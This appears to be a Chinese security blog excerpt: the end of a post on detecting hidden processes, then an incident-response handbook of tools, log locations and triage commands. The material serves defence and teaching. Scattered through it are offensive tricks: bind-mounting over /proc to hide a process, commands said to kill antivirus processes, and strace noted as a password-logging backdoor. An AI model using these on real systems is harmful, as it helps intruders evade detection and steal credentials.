    &lt;p&gt;在内核中新增两个信号，当进程向内核发出 hide 信号时，内核将不会为该进程在 /proc 目录下生成对应的目录，从而也就从底层铲除了进程的信息，即使黑客获得了 root 权限也无法通过常规手段察觉到蛛丝马迹。除此之外，新增的unhide信号作用恰好与 hide 信号相反。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;对其他用户隐藏&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;如果你使用的linux kernel(内核)是3.2以上的版本(或者使用的RHEL/CentOS是6.5以上的版本)，你就可以对其他用户隐藏进程。
只有root用户可以看到所有的进程，而非root用户，只能看到属于自己的进程信息。你所需要做的仅仅是开启linux kernel加固选项 “hidepid “来重新挂载 /proc文件系统。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://www.jb51.net/LINUXjishu/347787.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;linux下根据进程名称隐藏进程的PID&lt;/li&gt;
&lt;/ul&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;把要隐藏的进程PID设置为0，因为系统默认是不显示PID为0的进程，不过缺陷比较大。
其核心思想就是把task-&amp;gt;pid变成0，就成了0号进程。而在ps，top命令中，是不显示0号进程的相关信息。这么一来，在/proc/文件夹下就不会有该进程的相关信息了。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;修改系统调用sys_getdents（）。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://blog.chinaunix.net/uid-26585427-id-5077452.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ol&gt;
  &lt;li&gt;另外，还有一种比较简便的方法，就是把int main(int argc, char*argv[])中的参数变成0，那么就在单纯的ps命令中就不会显示进程相关信息，但是/proc/文件夹下，还会存在该进程的相关信息。&lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://blog.csdn.net/xqhrs232/article/details/51906206
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;遍历PspCidTable表检测隐藏进程&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://www.cnblogs.com/kuangke/p/5761615.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;部分补充说明&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在变更文件里可以看到一些挖矿程序，同时 /etc/ld.so.preload 文件的变更需要引起注意，这里涉及到 Linux 动态链接库预加载机制，是一种常用的进程隐藏方法，而 top 等命令都是受这个机制影响的。&lt;/p&gt;

&lt;p&gt;可以看看其中有没有包含可疑的so文件，然后记录后去掉。&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;注意
/etc/rc.d/init.d/network
/etc/resolv.conf

cat /etc/ld.so.preload
top 查看pid
ls  -lh /proc/pid号
得到相关文件位置后进行清理
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;隐藏进程，会出现proc下面大小异常：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cat /pro/$$/mountinfo 
cat /proc/mounts 
mount
以上三个等价，可靠性不同。

$$ 表示当前shell进程的进程ID

#处理后可以瞒过直接mount
cp /etc/mtab .
mount –bind /bin /proc/[pid]
mv . /etc/mtab

#这样可以进行隐藏
mount –bind /tmp/empty /proc/2694
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;windows工具检查&quot;&gt;Windows工具检查&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Winpmem内存转储【配合Volatility进行内存取证】&lt;/li&gt;
  &lt;li&gt;冰刃&lt;/li&gt;
  &lt;li&gt;process explorer&lt;/li&gt;
  &lt;li&gt;Filemon：查看进程和文件对应&lt;/li&gt;
  &lt;li&gt;Regmon：查看进程和注册表对应&lt;/li&gt;
  &lt;li&gt;PC Hunter(xuetr) 可查看硬盘上隐藏的文件&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;手动杀进程&quot;&gt;手动杀进程&lt;/h4&gt;

&lt;p&gt;非常古老的pskill&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pskill $PID
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;可以用它结束一些常见的杀毒软件进程，使用方法如下：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c:\&amp;gt; ProcessHacker.exe -c -ctype process -cobject $PID-Number -caction terminate
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;也是暂停进程的运行，如下：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c:\&amp;gt; ProcessHacker.exe -c -ctype process -cobject $PID-Number –caction suspend
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;wmic：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wmic process where caption=&quot;qq.exe&quot; delete
wmic process where handle=10000 delete
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;TASKKILL：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;TASKKILL /S system /F /IM notepad.exe /T
TASKKILL /PID 1230 /PID 1241 /PID 1253 /T
TASKKILL /F /IM QQ.exe
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;ntsd：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ntsd -c q -p pid
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;linux下工具检查&quot;&gt;Linux下工具检查：&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;暴力枚举进程
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;通过PsLookupProcessByProcessId获得EPROCESS
通过ZwQuerySystemInformation
通过进程活动连来枚举
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;hkrookit&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;rkhunter&lt;/p&gt;

    &lt;p&gt;具体用法，请查看：&lt;a href=&quot;/pentest/2018/06/25/security-emergency/&quot;&gt;《信安应急响应手册
》&lt;/a&gt;。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;偶然发现的小工具&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;可检测通过Hook vfs 函数来隐藏的进程。&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://security.tencent.com/index.php/opensource/detail/16
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Volatility：
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pslist – 通过检查双链表来检测进程
pstree – 使用了相同技术，只是显示有小小的差别
psscan – 在内存中扫描_POOL_HEADER结构（内存页池）以识别相关进程
psxview – 几种技术的组合：
pslist：如上所述
psscan：如上所述
thrdproc：线程扫描，检索调度程序使用的_KTHREAD列表（不能在不中断进程执行的情况下修改它），然后搜索相关的_EPROCESS对象。
pspcid
csrss：csrss.exe进程保留着可以在其内存中检索到的进程的独立列表。
session
deskthrd
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;尾声&quot;&gt;尾声&lt;/h3&gt;

&lt;p&gt;需要强调的是，攻防都是相对的，技术是在进步的，工具需要配合手工才能变成神器。&lt;/p&gt;

&lt;p&gt;以后在实践中遇到新东西，或者在其他资料站看到实用的内容，后面会继续给大家更新。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="cert" /><summary type="html">前段时间遇到了一些【进程隐藏】相关的应急事件，故此心生一念，对网上一些资料和部分个人经验做了总结，以飨众人。</summary></entry><entry><title type="html">信安应急响应手册</title><link href="/pentest/2018/06/25/security-emergency/" rel="alternate" type="text/html" title="信安应急响应手册" /><published>2018-06-25T12:56:18+08:00</published><updated>2018-06-25T12:56:18+08:00</updated><id>/pentest/2018/06/25/security-emergency</id><content type="html" xml:base="/pentest/2018/06/25/security-emergency/">&lt;p&gt;
	&lt;span style=&quot;color:#DAA520;&quot;&gt;&lt;strong&gt;在我们工作过程中，难免会遇到一些需要应急响应的事件。在紧急情况下，某些平时的苦工可能会帮助我们简化流程。这里做下应急方面的笔记，列出一些实用的小技巧。&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;h3 id=&quot;应急工具包&quot;&gt;应急工具包&lt;/h3&gt;

&lt;h4 id=&quot;tools-for-windows&quot;&gt;Tools for windows&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;Logparser&lt;/li&gt;
  &lt;li&gt;wireshark&lt;/li&gt;
  &lt;li&gt;WSExplorer&lt;/li&gt;
  &lt;li&gt;冰刃&lt;/li&gt;
  &lt;li&gt;process explorer&lt;/li&gt;
  &lt;li&gt;winsyscheck&lt;/li&gt;
  &lt;li&gt;PC Hunter(xuetr) 可查看硬盘上隐藏的文件&lt;/li&gt;
  &lt;li&gt;D盾/360网站卫士/安全狗&lt;/li&gt;
  &lt;li&gt;Filemon：查看进程和文件对应&lt;/li&gt;
  &lt;li&gt;Regmon：查看进程和注册表对应&lt;/li&gt;
  &lt;li&gt;Rootkit Unhooker：Hook检测&lt;/li&gt;
  &lt;li&gt;Rootkit Revelaer：rootkit检测&lt;/li&gt;
  &lt;li&gt;LP_Check工具检查: 找出影子管理员和克隆账号&lt;/li&gt;
  &lt;li&gt;Autoruns工具： 查看启动项&lt;/li&gt;
  &lt;li&gt;bitsadmin /list/allusers/verbose【好像不大好使】&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;tools-for-linux&quot;&gt;Tools for linux&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;chkrookit&lt;/li&gt;
  &lt;li&gt;rkhunter&lt;/li&gt;
  &lt;li&gt;tshark&lt;/li&gt;
  &lt;li&gt;shellpub(河马)&lt;/li&gt;
  &lt;li&gt;Auditd【linux自带审计】&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;简单用法：&lt;/p&gt;

&lt;p&gt;1、chkrootkit&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;下载：wget –c ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz
编译：tar xvzf chkrootkit.tar.gz
make sense
开始检测：./chkrootkit -q
如果出现INFECTED，说明检测出系统后门
可以直接使用./chkrootkit -q | grep INFECTED命令检测并筛选出存在INFECTED的内容
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;2、Rootkit Hunter&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;安装Rootkit Hunter：
tar xvzf rkhunter-xx.tar.gz
cd rkhunter-xx
./install.sh --layout default --install
开始检测：
rkhunter -check
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;3、强大的日志分析工具Log Parser
#分析IIS日志&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LogParser.exe &quot;select top 10 time, c-ip,cs-uri-stem, sc-status, time-taken from C:\Users\sm0nk\Desktop\iis.log&quot; -o:datagrid
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;有了这些我们就可以对windows日志进行分析了。&lt;/p&gt;

&lt;p&gt;比如我们分析域控日志的时候，想要查询账户登陆过程中，用户正确，密码错误的情况，我们需要统计出源IP，时间，用户名时，我们可以这么写（当然也可以结合一些统计函数，分组统计等等）：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LogParser.exe -i:EVT &quot;SELECT TimeGenerated,EXTRACT\_TOKEN(Strings,0,'|') AS USERNAME,EXTRACT\_TOKEN(Strings,2,'|') AS SERVICE\_NAME,EXTRACT\_TOKEN(Strings,5,'|') AS Client_IP FROM 'e:\logparser\xx.evtx' WHERE EventID=675&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;样本分析平台&quot;&gt;样本分析平台&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;VirusTotal（简称VT，https://www.virustotal.com/）&lt;/li&gt;
  &lt;li&gt;国内的微步在线（https://x.threatbook.cn/）&lt;/li&gt;
  &lt;li&gt;腾讯的哈勃系统（https://habo.qq.com/）&lt;/li&gt;
  &lt;li&gt;金山的火眼（https://fireeye.ijinshan.com/）&lt;/li&gt;
  &lt;li&gt;安全易【日志分析】（https://www.anquanyi.com/）&lt;/li&gt;
  &lt;li&gt;http://www.virscan.org 多引擎可疑文件扫描&lt;/li&gt;
  &lt;li&gt;https://ti.360.net/ 360威胁情报中心&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;日志相关&quot;&gt;日志相关&lt;/h4&gt;

&lt;p&gt;日志文件位置：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Apache日志位置配置在httpd.conf中。
IIS日志默认存放在%systemroot%\system32\LogFiles\W3SVC目录，如果没有，可以通过配置文件查找，WEB站点—属性—网站—W3C扩展日志文件格式—属性—日志文件目录
apache日志 /usr/local/apache/logs/access_log
weblogic日志 \your_domain\servers\AdminServer\logs\asscee_log
root命令记录 /root/.bash_history
普通用户命令记录：/home/普通用户/.bash_history
/var/log/messages 包括整体系统信息 系统启动期间的日志
/var/log/boot.log 包含系统启动的日志
/var/log/secure SSHD会将所有信息记录（包括失败记录）
/var/log/btmp 记录所有用户的最近信息
/var/log/*
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;应急命令集&quot;&gt;应急命令集&lt;/h3&gt;

&lt;h4 id=&quot;cmd-for-windows&quot;&gt;cmd for windows&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netstat -b -n【查看目前的网络连接情况】
netstat -ano
tasklist | findstr xxx
taskkill /T /F /PID PID号

知道是上传目录，在web log中查看指定时间范围包括上传文件夹的访问请求
findstr /s /m /I &quot;UploadFiles&quot; *.log
某次博彩事件中的六合彩信息是six.js
findstr /s /m /I &quot;six.js&quot; *.aspx
根据shell名关键字去搜索D盘spy相关的文件有哪些
for /r d:\ %i in (*spy*.aspx) do @echo %i

来查看创建时间：
dir /tc 1.aspx

查看用户recent相关文件，通过分析最近打开分析可疑文件

a) C:\Documents and Settings\Administrator\Recent
b) C:\Documents and Settings\Default User\Recent
c) 开始,运行 %UserProfile%\Recent
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;cmd-for-linux&quot;&gt;cmd for linux&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netstat  -antpl
lsof -p PID号
cd /proc/pidnumber
ls -ail
rm –rf /proc/pidnumber/恶意程序

curl ip.cn -H &quot;X-Forwarded-For: x.x.x.x&quot;
ps -ef、lsof -i:8080、netstat -lanp

stat -- 获取比 ls 更多的信息

部分敏感命令：
users:显示当前登陆用户信息。
Who:显示谁正在使用系统本地节点的信息。
Last:显示系统曾经被登陆的用户和TTYS。
w:查看谁登陆到系统中，且在做什么操作。 
netstat -anp:查看端口对应的进程关系。
lsof -p PID:查看进程对应的文件，配合netstat -anp查看端口进程文件之间的关系，可以找到可以端口进程对应的文件。
lsof -i:查看实时的进程、服务与端口信息。
ps -aux:查看进程。
chkconfig -list:查看服务启动信息。
find / -perm -004000 -type f:输出所有设置了SUID的文件。
rpm -Va:列举全部软件包的变化情况。


lsof命令用于查看你进程开打的文件，打开文件的进程，进程打开的端口(TCP、UDP)。找回/恢复删除的文件。是十分方便的系统监视工具，因为lsof命令需要访问核心内存和各种文件，所以需要root用户执行。
lsof -i:8080【进程号】

【ls实现列文件按时间排序】
1) ls -lt  时间最近的在前面
2) ls -ltr 时间从前到后
3) 利用sort
ls -l | sort +7 (日期为第8列)  时间从前到后
ls -l | sort -r +7 时间最近的在前面

【Strace动态调试】
strace -p PID

strace -o aa -ff -p ssh进程
grep open aa* | grep -v -e No -e null -e denied| grep WR
grep一下open系统调用，然后过滤掉错误信息和/dev/null信息，以及denied信息，并且找WR的
另外，这玩意儿可以当后门记录密码
---------------

查找shell：
find /var/www/html/ -type f -name &quot;*.jsp&quot; | xargs grep &quot;exec(&quot;
find /site/* -type f -name &quot;*.php&quot; |xargs grep &quot;eval(&quot; 　
find /site/* -type f -name &quot;*.asp&quot; |xargs grep &quot;execute(&quot;
find /site/* -type f -name &quot;*.aspx&quot; |xargs grep &quot;eval(&quot;
如果木马做了免杀处理，可以查看是否使用加密函数
find /site/* -type f -name &quot;*.php&quot; |xargs grep &quot;base64_decode&quot;
find /site/* -type f -name &quot;*.php&quot; |xargs grep &quot;@$&quot;

新增文件分析
例如要查找24小时内被修改的JSP文件： 
find ./ -mtime 0 -name &quot;*.jsp&quot;
（最后一次修改发生在距离当前时间n24小时至(n+1)24 小时）

查找72小时内新增的文件find / -ctime -2
PS：-ctime 内容未改变权限改变时候也可以查出
根据确定时间去反推变更的文件
ls -al /tmp | grep &quot;Feb 27&quot;

特殊权限的文件
查找777的权限的文件 find / *.jsp -perm 4777
---------------

查看可疑账号：

查看UID为0的帐号：awk -F: '{if($3==0)print $1}' /etc/passwd
查看能够登录的帐号：cat /etc/passwd | grep -E &quot;/bin/bash$&quot;
PS：UID为0的帐号也不一定都是可疑帐号，Freebsd默认存在toor帐号，且uid为0.（toor 在BSD官网解释为root替代帐号，属于可信帐号）

-----------------

查找日志：
1、注入漏洞记录
grep -i select%20 *.log  | grep 500 | grep -i \.php 
查找后缀为&quot;.log&quot;文件，搜索关键字为&quot;select%20&quot;,筛选存在&quot;500&quot;的行
grep -i sqlmap *.log
sqlmap默认User-Agent是sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org)，查看存在sqlmap的行，可以发现sqlmap拖库的痕迹。

2、跨站漏洞记录
grep -i &quot;script&quot; *.log 查找存在script的行。

3、扫描器扫描
grep -i acunetix *.log AWVS扫描时，会发送大量含有&quot;acunetix&quot;的数据包

4、搜索特定时间的日志
grep \[07/Jul/2016:24:00:* *.log 可以结合入侵时间搜索，文件修改时间不可作为依据，菜刀上就可以修改文件时间属性。

5、搜索特定IP地址的日志
grep ^192.168.1.* *.log 搜索包含&quot;192.168.1.&quot;字符串开头的行 
grep -v ^192.168.10.* *.log 不搜索包含&quot;192.168.10.&quot;字符串开头的行 
可以结合网站、网络安全策略搜索能访问网站后台、FTP服务等的IP地址。
查看ip访问次数：
cat access.log | awk '{print $1}' | sort | uniq -c
cat /var/log/secure |grep ACCEPTED 查看ssh进入的ip

页面访问排名前十的IP
cat access.log | cut -f1 -d &quot; &quot; | sort | uniq -c | sort -k 1 -r | head -10
页面访问排名前十的URL
cat access.log | cut -f4 -d &quot; &quot; | sort | uniq -c | sort -k 1 -r | head -10
查看最耗时的页面
cat access.log | sort -k 2 -n -r | head 10
---------------

查看所有用户的定时任务：
for u in `cat /etc/passwd | cut -d&quot;:&quot; -f1`;do crontab -l -u $u;done

netstat –tlp –ano | grep 'ip'



敏感文件：
/var/log/messages:记录整体系统信息，其中也记录某个用户切换到root权限的日志。 
/var/log/secure:记录验证和授权方面信息。例如sshd会将所有信息记录（其中包括失败登录）在这里。
/var/log/lastlog:记录所有用户的最近信息。二进制文件，因此需要用lastlog命令查看内容。
/var/log/btmp:记录所有失败登录信息。使用last命令可查看btmp文件。例如&quot;last -f /var/log/btmp | more&quot;。
/var/log/maillog:记录来着系统运行电子邮件服务器的日志信息。例如sendmail日志信息就送到这个文件中。
/var/log/mail/:记录包含邮件服务器的额外日志。
/var/log/wtmp或/var/log/utmp:记录登录信息。二进制文件，须用last来读取内容;
/etc/passwd:记录用户信息，查看是否存在可疑账号。
/etc/shadow:记录用户密码，查看是否存在可疑账号。
.bash_history:shell日志，查看之前使用过的命令。
/var/log/cron:记录计划任务。


grep evil_ip /var/log/secure*【查看last记录里的可疑ip】
grep &quot;Accept&quot; /var/log/secure* | awk '{print $11}' | sort | uniq【查看所有登录成功的ip】

检查常用命令是否被替换：
[root[@ceshi1](/user/ceshi1) log]# ls -alt /bin/ | head -n 10
[root[@ceshi1](/user/ceshi1) log]# ls -alt /usr/bin/ | head -n 10
[root[@ceshi1](/user/ceshi1) log]# ls -alt /usr/sbin/ | head -n 10

查看.sshd里面的ip：
strings /usr/bin/.sshd | egrep '[1-9]{1,3}\.[1-9]{1,3}\.'

发现可疑进程，查看所在途径【随时准备拷贝自用的bin文件，比如ps】：
netstat -antlp
ps axu | grep xxx| grep -v grep

pstree -p【感觉完全没有win下叼啊】

查看一些临时目录

例如要查找24小时内被修改的JSP文件：
find ./ -mtime 0 -name &quot;*.jsp&quot;

find ./ -mtime 2
搜索是的48~72小时内修改的文件。

find . –mtime +n:
最后一次修改发生在n+1天以前，距离当前时间为(n+1)*24小时或者更早

find . –mtime –n:
最后一次修改发生在n天以内，距离当前时间为n*24小时以内

查找24小时内被修改的JSP文件也可以用：
find ./ -mtime -1 -name &quot;*.jsp&quot;

--------------
echo $PATH 分析有无敏感可疑信息
a) strings命令在对象文件或二进制文件中查找可打印的字符串
b) 分析sshd 文件，是否包括IP信息strings /usr/bin/.sshd | egrep '[1-9]{1,3}.[1-9]{1,3}.'
PS：此正则不严谨，但匹配IP已够用
c) 根据关键字匹配命令内是否包含信息（如IP地址、时间信息、远控信息、木马特征、代号名称）
查看ssh相关目录有无可疑的公钥存在。
a) Redis（6379） 未授权恶意入侵，即可直接通过redis到目标主机导入公钥。
b) 目录： /etc/ssh ./.ssh/
--------------------------



查看访问控制文件权限：
setfacl与getfacl

lsattr和chattr
修改属性能够提高系统的安全 性，但是它并不适合所有的目录。chattr命令不能保护/、/dev、/tmp、/var目录
例子：设置/etc/resolv.conf为不可修改
[root@vincent tmp]# chattr +i /etc/resolv.conf 
[root@vincent tmp]# lsattr /etc/resolv.conf 
----i--------e- /etc/resolv.conf
[root@vincent tmp]# echo &quot;&quot; &amp;gt; /etc/resolv.conf 
-bash: /etc/resolv.conf: 权限不够
lsattr
查看文件权限
[root@vincent tmp]# lsattr 1.txt 
-----a-------e- 1.txt


【获取反弹bash】
netstat -antlp | grep EST | grep bash
【检查在监听的端口】
netstat -antlp | grep LISTEN

【查找敏感目录/tmp, /var/tmp, /dev/shm】
# ls -ald xxx

默认的history仅记录执行的命令，然而这些对于应急来说是不够的，很多系统加固脚本会添加记录命令执行的时间，修改记录的最大条数。
之前写的关于Bash审计方式也很推荐。从Bash4.1 版本开始，Bash开始支持Rsyslog.

find ./ -mtime 0 -name &quot;*.jsp&quot; 【找webshell】
diff -r {生产dir} {测试dir}



启动项排查：
【总结一下，针对CentOS5系统，需要排查的点】：
1）/etc/inittab
该文件是可以运行process的，这里我们添加一行
&amp;gt; 0:235:once:/bin/vinc
内容如下
[root@localhost ~]# cat /bin/vinc 
#!/bin/bash
cat /etc/issue &amp;gt; /tmp/version
重启
[root@localhost ~]# cat /tmp/version 
CentOS release 5.5 (Final)
Kernel \r on an \m
2）/etc/rc.d/rc.sysinit
在最后插入一行/bin/vinc
[root@localhost ~]# ll /tmp/version 
-rw-r--r-- 1 root root 47 11-05 10:10 /tmp/version
3）/etc/rc.d/init.d
4）/etc/rc.d/rc.local
【总结一下，针对CentOS6系统，需要排查的点】：
1）/etc/init/*.conf
vim tty.conf，添加一行
&amp;gt; exec /bin/vinc
内容如下:
[root@vincenthostname init]# cat /bin/vinc 
#!/bin/bash

touch /tmp/vinc
重启
[root@vincenthostname ~]# ll /tmp/vinc
-rw-r--r-- 1 root root 0 6月  22 15:07 /tmp/vinc
2）/etc/rc.d/rc.sysinit
3）/etc/rc.d/init.d
4）/etc/rc.d/rc.local

定时部分：
应急响应中关于定时任务应该排查的/etc/crontab,/etc/cron.d,/var/spool/cron/{user},然后顺藤摸瓜去看其他调用的目录/etc/cron.hourly, /etc/cron.daily, /etc/cron.weekly, /etc/cron.monthly，/etc/anacrontab 。
其中容易忽视的就是/etc/anacrontab

这里就需要介绍一些/usr/sbin/anacron，anacron是干什么的？
anacron主要在处理非 24 小时一直启动的 Linux 系统的 crontab 的运行。

ll /var/spool/cron/*
------------

检查命令替换部分：
1）系统完整性可以通过rpm自带的-Va来校验检查所有的rpm软件包,有哪些被篡改了,防止rpm也被替换,上传一个安全干净稳定版本rpm二进制到服务器上进行检查。
例如我替换一下/bin/ps，然后使用rpm -qaV查看
[root@vincenthostname tmp]# rpm -qa /bin/ps
2）比对命令的大小
例如正常的ps和netstat大小
[root@vincent tmp]# ll /bin/ps
-rwxr-xr-x 1 root root 87112 11月 15 2012 /bin/ps
[root@vincent tmp]# ll /bin/netstat
-rwxr-xr-x 1 root root 128216 5月 10 2012 /bin/netstat
下面是其中有一次应急时的记录
[root@DataNode110 admin]# ls -alt /bin/ | head -n 10
total 10836
-rwxr-xr-x 1 root root 625633 Aug 17 16:26 tawlqkazpu
dr-xr-xr-x. 2 root root 4096 Aug 17 16:26 .
-rwxr-xr-x 1 root root 1223123 Aug 17 11:30 ps
-rwxr-xr-x 1 root root 1223123 Aug 17 11:30 netstat
可以看到ps和netstat是一样大的。
3）查看命令的修改时间，按修改时间排序
ls -alt /bin/ | head -n 5
4）使用chkrootkit和rkhunter查看
chkrootkit
1、准备gcc编译环境
对于CentOS系统，执行下述三条命令：
&amp;gt; yum -y install gcc gcc-c++ make glibc*
2、下载chkrootkit源码
chkrootkit的官方网站为 http://www.chkrootkit.org ，下述下载地址为官方地址。为了安全起见，务必在官方下载此程序：
&amp;gt; [root@www ~]# wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz
3、解压下载回来的安装包
&amp;gt; [root@www ~]# tar zxf chkrootkit.tar.gz
4、编译安装（后文命令中出现的&quot;*&quot;无需替换成具体字符，原样复制执行即可）
&amp;gt;[root@www ~]# cd chkrootkit-*
&amp;gt;
&amp;gt;[root@www ~]# make sense
注意，上面的编译命令为make sense。
5、把编译好的文件部署到/usr/local/目录中，并删除遗留的文件
&amp;gt;[root@www ~]# cd ..
&amp;gt;[root@www ~]# cp -r chkrootkit- /usr/local/chkrootkit
&amp;gt;[root@www ~]# rm -r chkrootkit-
至此，安装完毕。
使用方法
安装好的chkrootkit程序位于 /usr/local/chkrootkit/chkrootkit
直接执行
&amp;gt; root@vm:~# /usr/local/chkrootkit/chkrootkit
rkhunter
在安装了kbeast的系统上测试，发现检测效果不如rkhunter好。
下载地址： http://sourceforge.net/projects/rkhunter/files/
1）安装
tar -xvf rkhunter-1.4.0.tar.gz
cd rkhunter-1.4.0
./installer.sh –install
在安装了kbeast的系统上测试，可以成功检测到。
/usr/local/bin/rkhunter –check -sk
[19:50:27] Rootkit checks…
[19:50:27] Rootkits checked : 389
[19:50:27] Possible rootkits: 1
[19:50:27] Rootkit names : KBeast Rootkit
2）在线升级
rkhunter是通过一个含有rootkit名字的数据库来检测系统的rootkits漏洞, 所以经常更新该数据库非常重要, 你可以通过下面命令来更新该数据库:
执行命令：
&amp;gt; rkhunter –update
3）检测最新版本
让 rkhunter 保持在最新的版本；
执行命令：
&amp;gt; rkhunter –versioncheck


【创建Audit审计规则】
vim /etc/audit/audit.rules
-a exclude,always -F msgtype=CONFIG_CHANGE
-a exit,always -F arch=b64 -F uid=48 -S execve -k webshell

【编写测试Java命令监控规则，Jboss的启动账户为nobody，添加审计规则】
# grep '\-a' /etc/audit/audit.rules 
-a exclude,always -F msgtype=CONFIG_CHANGE
-a exit,always -F arch=b32 -F uid=99 -S execve -k webshell
【重启服务】
# service auditd restart
Stopping auditd: [ OK ]
Starting auditd: [ OK ]

查看恶意ip试图登录次数：
lastb | awk '{ print $3}'  | sort | uniq -c | sort -n

SSH部分：
【查看登录成功信息】
grep 'Accepted' /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr
或者last命令，它会读取位于/var/log/wtmp的文件

【查看登录失败信息】
grep 'Failed' /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr
或者lastb命令，会读取位于/var/log/btmp的文件

